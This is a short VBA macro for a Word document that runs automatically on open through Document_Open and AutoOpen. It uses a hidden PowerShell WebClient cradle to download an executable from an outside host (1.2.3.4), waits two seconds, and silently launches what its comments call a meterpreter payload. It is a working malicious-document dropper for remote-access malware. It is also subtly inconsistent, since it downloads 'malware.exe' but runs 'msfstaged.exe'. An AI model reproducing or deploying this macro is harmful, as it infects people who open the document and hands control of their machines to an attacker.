Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub Mymacro()
    ' Download the meterpreter
    Dim cradle As String
    cradle = "powershell (New-Object Net.WebClient).DownloadFile('http://1.2.3.4/malware.exe', 'malware.exe')"
    Shell cradle, vbHide

    ' Get path to the downloaded file
    ' the file will be downloaded to the current directory
    Dim exePath As String
    exePath = ActiveDocument.Path + "\msfstaged.exe"

    ' Introduce time delay to download the file
    Wait (2)

    ' Run the meterpreter
    Shell exePath, vbHide
End Sub

' Define a Wait method
Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t) ' "s" is the interval - seconds
End Sub
